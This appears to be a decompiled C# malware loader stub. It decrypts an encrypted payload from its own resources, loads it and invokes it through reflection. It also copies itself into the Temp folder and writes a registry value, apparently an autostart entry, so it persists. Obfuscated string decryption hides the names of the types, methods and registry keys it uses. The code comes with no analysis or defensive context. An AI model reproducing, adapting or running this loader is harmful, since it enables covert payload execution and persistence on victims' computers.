using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

public class LKadgYwM
{
	[STAThread]
	public static void Main()
	{
		string fullyQualifiedName = Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName;
		Thread.Sleep(0);
		ResourceManager resourceManager = new ResourceManager("bbDL", Assembly.GetExecutingAssembly());
		Assembly.Load(JSDJSJDSDDDDD.NxOSVM((byte[])NewLateBinding.LateIndexGet(resourceManager.GetObject("CjBnrRFDwPMiFdj"), new object[1] { 1 }, (string[])null), "NRULkzrcKMhKOcm")).GetType(JSDJSJDSDDDDD.EhwQjD("5OxDqeKfU7Y=", "GzHkxw"))!.GetMethod(JSDJSJDSDDDDD.EhwQjD("84uvEcZnDXMZ0DFLfdv1bg==", "cIRSQV"))!.Invoke(null, new object[6]
		{
			JSDJSJDSDDDDD.NxOSVM((byte[])NewLateBinding.LateIndexGet(resourceManager.GetObject("CjBnrRFDwPMiFdj"), new object[1] { 0 }, (string[])null), "MIvQHxMWFEreFbn"),
			true,
			JSDJSJDSDDDDD.EhwQjD("CdP5L0VCnD4=", "roLuGMITkl"),
			".exe",
			true,
			false
		});
		if (Operators.CompareString(fullyQualifiedName, Path.GetTempPath() + JSDJSJDSDDDDD.EhwQjD("AbJi3gFFwja7mzBJErJ3cw==", "JmCi"), false) != 0)
		{
			File.Copy(fullyQualifiedName, Path.GetTempPath() + JSDJSJDSDDDDD.EhwQjD("AbJi3gFFwja7mzBJErJ3cw==", "JmCi"), overwrite: true);
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(JSDJSJDSDDDDD.EhwQjD("NRJlzd60JNHQrLN3ATW0zBsQe3Y9zMbc4YyezCwGE1V2BLVS7eSfZVS+TmgIKKKC", "suEb"), writable: true);
			registryKey.SetValue(JSDJSJDSDDDDD.EhwQjD("FIBKmMaJTwlwQntYOFiKoA==", "oIQG"), Path.GetTempPath() + JSDJSJDSDDDDD.EhwQjD("AbJi3gFFwja7mzBJErJ3cw==", "JmCi"), RegistryValueKind.String);
			registryKey.Close();
		}
	}
}
